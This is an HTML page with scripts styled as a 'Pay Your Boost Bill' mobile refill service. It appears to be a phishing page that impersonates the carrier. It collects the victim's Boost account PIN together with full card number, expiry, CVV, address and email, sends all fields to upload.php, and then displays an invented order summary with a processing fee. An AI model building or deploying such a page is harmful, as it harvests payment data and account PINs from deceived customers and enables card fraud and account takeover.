<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Your Boost Bill</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="css/sweetalert2.min.css">
    <link rel="stylesheet" href="css/style.min.css">
</head>

<body>

    <div class="container mt-5 title-section py-3 rounded">
        <div class="row">
            <div class="col-4 d-flex align-items-center justify-content-center">
                <img class="w-100" src="https://picsum.photos/200" alt="img">
            </div>
            <div class="col-8 d-flex flex-column justify-content-center">
                <h2>Instant Mobile Recharge</h2>
                <ul class="list-items">
                    <li class="mb-2">Online available 24/7</li>
                    <li>Easy & secure payments</li>
                </ul>
            </div>
        </div>
    </div>
    <div class="container my-5 boost-form">
        <div class="row">
            <div class="col-12 col-lg-4 mx-auto rounded">
                <form id="boostForm">
                    <!-- First Step -->
                    <div id="first-step" class="row">
                        <div class="col-12 text-center">
                            <h3 class="fw-bold mb-4 ls-1">Refill Your Boost Mobile</h3>
                        </div>
                        <div class="col-12">
                            <div class="form-group">
                                <label for="mobileNumber">Enter Your Boost Mobile Number</label>
                                <input type="tel" name="mobileNumber" id="mobileNumber" class="form-control" placeholder="+1 XXX-XXX-XXXX" required>
                            </div>
                        </div>
                        <div class="col-12 mt-3">
                            <div class="form-group">
                                <label for="renterMobileNumber">Re-enter Your Boost Mobile Number</label>
                                <input type="tel" name="renterMobileNumber" id="renterMobileNumber" class="form-control" placeholder="+1 XXX-XXX-XXXX" required>
                            </div>
                        </div>
                        <div class="col-12 mt-3">
                            <div class="form-group">
                                <label for="boostPin">Enter 4-digit Boost pin</label>
                                <input type="text" name="boostPin" id="boostPin" class="form-control" placeholder="XXXX" required>
                            </div>
                        </div>
                        <div class="col-12 mt-3">
                            <div class="form-group">
                                <label for="amount">Enter Amount</label>
                                <input type="text" name="amount" id="amount" class="form-control" placeholder="Enter Amount Between $10 to $200" required>
                            </div>
                        </div>
                        <div class="col-12 mt-4">
                            <button class="btn btn-primary w-100 continue">Continue</button>
                        </div>
                    </div>
                    <!-- Second Step -->
                    <div id="second-step" class="row d-none">
                        <div class="col-12">
                            <h3 class="text-center fw-bold ls-1">Payment Information</h3>
                        </div>
                        <div class="col-12">
                            <div class="form-group">
                                <label for="cardHolderName">Card Holder Name</label>
                                <input type="text" name="cardHolderName" id="cardHolderName" class="form-control" placeholder="Name on Card" required>
                            </div>
                        </div>
                        <div class="col-12 mt-3">
                            <div class="form-group">
                                <label for="cardNumber">Card Number</label>
                                <input type="text" name="cardNumber" id="cardNumber" class="form-control" placeholder="4242424242424242" required>
                            </div>
                        </div>
                        <div class="col-4 mt-3">
                            <div class="form-group">
                                <label for="cardMonth">Month</label>
                                <select type="text" name="cardMonth" id="cardMonth" class="form-control" required>
                                    <option selected hidden value="">Month</option>
                                    <option value="1">1</option>
                                    <option value="2">2</option>
                                    <option value="3">3</option>
                                    <option value="4">4</option>
                                    <option value="5">5</option>
                                    <option value="6">6</option>
                                    <option value="7">7</option>
                                    <option value="8">8</option>
                                    <option value="9">9</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-4 mt-3">
                            <div class="form-group">
                                <label for="cardYear">Year</label>
                                <select type="text" name="cardYear" id="cardYear" class="form-control" required>
                                    <option selected hidden value="">Year</option>
                                    <option value="2019">2019</option>
                                    <option value="2020">2020</option>
                                    <option value="2021">2021</option>
                                    <option value="2022">2022</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-4 mt-3">
                            <div class="form-group">
                                <label for="cvv">Cvv/Cvc</label>
                                <input type="text" name="cvv" id="cvv" class="form-control" placeholder="XXX" required>
                            </div>
                        </div>
                        <div class="col-3"></div>
                        <div class="col-6 mt-3">
                            <div class="form-group">
                                <label for="zipCode">zipCode</label>
                                <input type="text" name="zipCode" id="zipCode" class="form-control" placeholder="XXXXX" required>
                            </div>
                        </div>
                        <div class="col-3"></div>
                        <div class="col-12 mt-4">
                            <h3 class="text-center fw-bold ls-1">Address Details</h3>
                        </div>
                        <div class="col-6">
                            <div class="form-group">
                                <label for="city">City</label>
                                <input type="text" name="city" id="city" class="form-control" placeholder="New York City" required>
                            </div>
                        </div>
                        <div class="col-6">
                            <label for="state">State/Province</label>
                            <select name="state" id="state" class="form-control" required>
                                <option value="" selected hidden>State</option>
                                <option value="Alabama">Alabama</option>
                                <option value="Alaska">Alaska</option>
                                <option value="California">California</option>
                                <option value="New York">New York</option>
                            </select>
                        </div>
                        <div class="col-12 mt-4">
                            <h3 class="text-center fw-bold ls-1">Contact Details</h3>
                        </div>
                        <div class="col-12">
                            <div class="form-group">
                                <label for="cellNumber">Mobile Number</label>
                                <input type="tel" name="cellNumber" id="cellNumber" class="form-control" placeholder="+1 XXX-XXX-XXXX" required>
                            </div>
                        </div>
                        <div class="col-12 mt-3">
                            <div class="form-group">
                                <label for="email">Email</label>
                                <input type="email" name="email" id="email" class="form-control" placeholder="example@gmail.com" required>
                            </div>
                        </div>
                        <div class="col-6 mt-3">
                            <a href="#!" class="btn btn-primary go-back w-100">Back</a>
                        </div>
                        <div class="col-6 mt-3">
                            <button type="submit" class="btn btn-success w-100">Pay</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.20.0/jquery.validate.min.js" integrity="sha512-WMEKGZ7L5LWgaPeJtw9MBM4i5w5OSBlSjTjCtSnvFJGSVD26gE5+Td12qN5pvWXhuWaWcVwF++F7aqu9cvqP0A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.20.0/additional-methods.min.js" integrity="sha512-TiQST7x/0aMjgVTcep29gi+q5Lk5gVTUPE9XgN0g96rwtjEjLpod4mlBRKWHeBcvGBAEvJBmfDqh2hfMMmg+5A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <script src="js/sweetalert2.min.js"></script>

    <script>
        $(document).ready(function() {
            $.validator.addMethod('CCExp', function(value, element, params) {
                var minMonth = new Date().getMonth() + 1;
                var minYear = new Date().getFullYear();
                var month = parseInt($(params.month).val(), 10);
                var year = parseInt($(params.year).val(), 10);
                return (year > minYear) || (year === minYear && month >= minMonth);
                // return ((year === minYear && month >= minMonth) || year > minYear);
            }, 'Date is invalid.');

            $('#boostForm').validate({
                errorClass: "invalid",
                validClass: "success",
                errorElement: "em",
                rules: {
                    "mobileNumber": {
                        required: true,
                        phoneUS: true
                    },
                    "renterMobileNumber": {
                        required: true,
                        equalTo: "#mobileNumber"
                    },
                    "cellNumber": {
                        required: true,
                        phoneUS: true
                    },
                    "boostPin": {
                        required: true,
                        number: true,
                        minlength: 4,
                        maxlength: 4
                    },
                    "amount": {
                        required: true,
                        number: true,
                        min: 10,
                        max: 200
                    },
                    "cardNumber": {
                        required: true,
                        creditcard: true
                    },
                    "cardMonth": {
                        required: true
                    },
                    "cardYear": {
                        required: true,
                        CCExp: {
                            month: '#cardMonth',
                            year: '#cardYear'
                        }
                    },
                    "cvv": {
                        required: true,
                        number: true,
                        minlength: 3,
                        maxlength: 4
                    },
                    "email": {
                        required: true,
                        email: true
                    }
                },
                messages: {
                    mobileNumber: "Please Enter a Valid US Number",
                    renterMobileNumber: {
                        equalTo: "Please Enter Same US Number Above"
                    },
                    cellNumber: "Please Enter a Valid US Number",
                    boostPin: {
                        required: "Please enter Boost Pin",
                    },
                    amount: {
                        required: "Please enter amount",
                        min: "Please enter amount between $10 - $200",
                        max: "Please enter amount between $10 - $200"
                    },
                    cardNumber: "Please Enter a Valid Card Number"
                }
            });
            $(document).on('click', '.continue', function(e) {
                e.preventDefault();
                if ($('#boostForm').valid()) {
                    $(this).parents('#first-step').addClass('d-none');
                    $('#second-step').removeClass('d-none');
                }
            });
            // work in progress ~ ALHAMDU LILLAH alot of points done.
            $(document).on('submit', '#boostForm', function(e) {
                e.preventDefault();
                let formData = $(this).serialize();
                if ($('#boostForm').valid()) {
                    $.ajax({
                        url: 'upload.php',
                        method: 'post',
                        data: formData,
                        success: function(result) {
                            let res = JSON.parse(result);
                            console.log(res);
                            Swal.fire({
                                title: "ORDER SUMMARY",
                                icon: "success",
                                html: `
                                    <div class="container order_summary">
                                        <div class="row text-left">
                                            <div class="col-6">
                                                <span class="title">Phone Number:</span>
                                            </div>
                                            <div class="col-6">
                                                ${res.phNum}
                                            </div>
                                            <div class="col-6 mt-2">
                                                <span class="title">Amount:</span>
                                            </div>
                                            <div class="col-6 mt-2">
                                                $${res.amount}
                                            </div>
                                            <div class="col-6 mt-2">
                                                <span class="title">Processing Fee:</span>
                                            </div>
                                            <div class="col-6 mt-2">
                                                $${res.processFee}
                                            </div>
                                            <div class="col-6 mt-2">
                                                <span class="title">Total:</span>
                                            </div>
                                            <div class="col-6 mt-2">
                                                $${res.total}
                                            </div>
                                            <div class="col-12 text-center mt-3">
                                                <span class="title bg">Total Charges</span>
                                            </div>
                                            <div class="col-12 text-center total-amount">
                                                $${res.total} USD
                                            </div>
                                        </div>
                                    </div>
                                    `
                            });
                            setTimeout(() => {
                                window.location.href = "/PayYourBoostBill";
                            }, 5000);
                        }
                    })
                }
            });
            $(document).on('click', '.go-back', function(e) {
                e.preventDefault();
                $(this).parents('#second-step').addClass('d-none');
                $('#first-step').removeClass('d-none');
            });
        });
    </script>

</body>

</html>